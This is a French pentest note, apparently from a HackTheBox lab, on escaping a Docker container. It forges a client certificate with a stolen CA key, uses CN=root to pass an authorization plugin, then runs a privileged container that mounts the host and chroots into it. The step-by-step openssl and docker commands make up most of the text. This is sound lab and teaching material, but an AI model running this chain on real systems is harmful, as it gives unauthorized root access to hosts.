# Docker Escape via Certificats TLS Forgés

## <mark style="color:red;">🐋 Docker Escape via Certificats TLS Forgés</mark>

### <mark style="color:blue;">Concept</mark>

Docker peut être configuré pour exposer son API sur un port TCP avec authentification TLS mutuelle. Si un attaquant récupère la **clé privée de la CA (Certificate Authority)**, il peut forger des certificats clients arbitraires — y compris avec un Common Name (CN) qui bypass les plugins d'autorisation — et obtenir un accès complet au démon Docker.

> **Impact** : Accès à l'API Docker → création de conteneur `--privileged` avec le système de fichiers hôte monté → évasion totale du conteneur.

***

### Prérequis

* Accès en lecture aux fichiers de certificats Docker (CA key incluse)
* Docker API accessible (ex : `127.0.0.1:2376`)
* Image Docker disponible sur l'hôte

***

### <mark style="color:blue;">Architecture ciblée</mark>

```
dockerd \
  --tlsverify \
  --tlscacert=/etc/docker/certs/ca.pem \
  --tlscert=/etc/docker/certs/server-cert.pem \
  --tlskey=/etc/docker/certs/server-key.pem \
  --authorization-plugin=authz-broker \
  -H=127.0.0.1:2376
```

| Protection           | Mécanisme                              | Bypass                     |
| -------------------- | -------------------------------------- | -------------------------- |
| TLS Encryption       | Chiffrement obligatoire                | Utiliser les certs forgés  |
| Mutual TLS Auth      | Client doit avoir cert signé par la CA | CA key volée → forger cert |
| Authorization Plugin | Vérifie le CN du certificat            | Mettre `CN=root`           |

***

### Étapes d'exploitation

#### 1. Récupérer les certificats CA

```bash
ls -la /srv/web.fries.htb/certs/
# ca-key.pem      ← CLÉ PRIVÉE CA (critique)
# ca.pem          ← Certificat CA public
# server-cert.pem
# server-key.pem

# Copier vers un répertoire de travail
cp /srv/web.fries.htb/certs/ca.pem /tmp/work/
cp /srv/web.fries.htb/certs/ca-key.pem /tmp/work/
```

***

#### 2. Générer une clé privée client

```bash
openssl genrsa -out client-key.pem 2048
```

***

#### 3. Créer une CSR avec `CN=root`

```bash
openssl req -new -key client-key.pem -out client.csr -subj "/CN=root"
```

> **Pourquoi `CN=root` ?** Le plugin d'autorisation (`authz-broker`) utilise le CN du certificat pour identifier l'utilisateur. Avec `CN=root`, il accorde tous les droits.

***

#### 4. Configurer les extensions

```bash
echo "extendedKeyUsage = clientAuth" > ext.cnf
```

***

#### 5. Signer le certificat avec la CA volée

```bash
openssl x509 -req \
  -in client.csr \
  -CA ca.pem \
  -CAkey ca-key.pem \
  -CAcreateserial \
  -out client-cert.pem \
  -days 3650 \
  -extfile ext.cnf
```

Le certificat résultant est signé par la vraie CA → Docker lui fait confiance. Son CN est `root` → le plugin d'autorisation l'accepte.

***

#### 6. Se connecter à l'API Docker

```bash
docker --tlsverify \
  -H=127.0.0.1:2376 \
  --tlscacert=ca.pem \
  --tlscert=client-cert.pem \
  --tlskey=client-key.pem \
  ps
```

Si la commande retourne la liste des conteneurs, l'accès est confirmé.

***

#### 7. Lancer un conteneur d'évasion

```bash
docker --tlsverify \
  -H=127.0.0.1:2376 \
  --tlscacert=ca.pem \
  --tlscert=client-cert.pem \
  --tlskey=client-key.pem \
  run -it --privileged -v /:/host <IMAGE> bash
```

| Option         | Effet                                                                |
| -------------- | -------------------------------------------------------------------- |
| `--privileged` | Désactive toutes les protections (namespaces, capabilities, cgroups) |
| `-v /:/host`   | Monte le système de fichiers complet de l'hôte dans `/host`          |

***

#### 8. S'échapper vers le système hôte

Une fois dans le conteneur :

```bash
# Lire directement les fichiers de l'hôte
cat /host/root/root.txt

# Ou effectuer un chroot pour opérer nativement sur l'hôte
chroot /host

# Vérification
whoami      # → root
hostname    # → nom de la machine hôte (pas du conteneur)
```

**`chroot /host`** redéfinit `/` pour pointer vers le vrai système de fichiers → vous êtes effectivement sorti du conteneur.

***

### <mark style="color:blue;">Schéma de l'attaque</mark>

```
Attaquant (barman)
│
├─► Vol ca-key.pem (groupe infra_managers)
│
├─► Génère client-key.pem + CSR (CN=root)
│
├─► Signe avec ca-key.pem → client-cert.pem
│       ↓
│   Docker voit : cert valide (signé par CA connue)
│   Plugin voit : CN=root → accès total
│
├─► docker run --privileged -v /:/host → shell conteneur
│
└─► chroot /host → root@hôte ✅
```

***
